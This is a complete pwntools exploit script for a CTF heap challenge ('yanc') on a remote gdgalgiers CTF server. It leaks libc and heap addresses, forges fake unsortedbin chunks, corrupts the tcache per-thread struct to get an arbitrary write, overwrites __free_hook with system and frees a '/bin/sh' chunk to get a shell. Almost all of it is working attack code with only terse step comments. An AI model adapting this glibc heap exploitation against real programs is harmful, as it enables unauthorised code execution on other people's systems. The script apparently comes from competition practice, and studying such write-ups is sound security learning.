from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './yanc'
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT = 1406

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(idx, s, title = b'a' * 8, content = b'b' * 8):
	r.sendlineafter(b'Choice: ', b'1')
	r.sendlineafter(b': ', str(idx).encode())
	r.sendlineafter(b': ', str(s).encode())
	r.sendafter(b': ', title)
	r.sendafter(b': ', content)

def s(idx):
	r.sendlineafter(b'Choice: ', b'2')
	r.sendlineafter(b': ', str(idx).encode())

def e(idx, title):
	r.sendlineafter(b'Choice: ', b'3')
	r.sendlineafter(b': ', str(idx).encode())
	r.sendafter(b': ', title)

def d(idx):
	r.sendlineafter(b'Choice: ', b'4')
	r.sendlineafter(b': ', str(idx).encode())

def c(idx):
	r.sendlineafter(b'Choice: ', b'5')
	r.sendlineafter(b': ', str(idx).encode())

r = start()

for i in range(9):
	a(i, 0x70)
for i in range(5):
	d(i)

# 2 unsortedbin
d(6)
d(8)
d(7)
d(5)

# clear tcache
c(-81)

# move to smallbin
a(0, 0x80)
d(0)

# leak address
a(2, 0x70, title=b'\x01')
s(2)
r.recvuntil(b'ID: ')
leak = int(r.recvuntil(b'\n', True), 10)
dbg('leak')
base = leak - 0x1ebc02
fh = base + 0x1eeb28
dbg('base')
r.recvuntil(b'Title: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
heap = leak - 0x501
dbg('heap')
if args.D:
	#debug(r, [0x1688])
	#debug(r, [0x1349])
	debug(r, [])
d(2)

# 1. create fake unsortedbin list [ heap+0x710 --> chunk#0 @heap+0x8e0 --> heap+0x290 --> chunk#1 ]
# 2. fill heap+0x290 chunk with fake 0x290 sized chunks
# 3. put tcache per-thread struct into unsortedbin
# 4. overwrite tcache per-thread struct to gain aaw


# set 2 fake chunk to link heap+0x290 to tcache
a(0, 0xc0)
a(1, 0xc0)
for i in range(8):
	a(i+2, 0x70)

for i in range(7):
	d(i + 3)
d(0)
a(0, 0xc0, title=b'\x91', content=flat(heap+0x710, heap+0x290)+p64(0x90)*15+p64(0x20))
d(1)
a(1, 0xc0, title=b'\x91', content=flat(heap+0x290, base+0x1ebc60)+p64(0x90)*15+p64(0x20))
a(10, 0xa0, title=b'\x21', content=flat(0x21)*(0x14))
d(2)
c(-81)

# spray 0x290 header and /bin/sh
for i in range(3, 10):
	a(i, 0xb0, title=b'\x91\x02',content=flat(u64(b'/bin/sh\x00'), 0x291)*11)
a(11, 0xb0)
a(12, 0xb0)
a(13, 0xb0)

# link fake chain to unsortedbin
e(2, p64(heap+0x8e0))

# stash fake chunk to tcache
a(14, 0x70, title=b'cccccccc', content=b'dddddddd')
a(15, 0x70, title=b'eeee', content=b'ffff')

# overwrite heap+0x290
a(2, 0x70, title=p64(heap+0x2a0), content=flat(heap+0x10, heap+0xed0, heap+0xef0, heap+0xf10, heap+0xf30, heap+0xf50, heap+0xf70, heap+0xf90, heap+0xfb0, heap+0xfc0))

# fill 0x290 sized tcache
for i in range(8):
	d(i+3)

# put tcache per-thread struct into unsortedbin
d(2)

# set aaw condition
a(2, 0xd0, title=p64(0x101010101010101), content=flat(0x101010101010101)*(0x70//8)+flat(0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, fh-0x18))
system = base + 0x55410

# overwrite free hook
a(4, 0x70, content=flat(0, system))
d(11)
r.interactive()


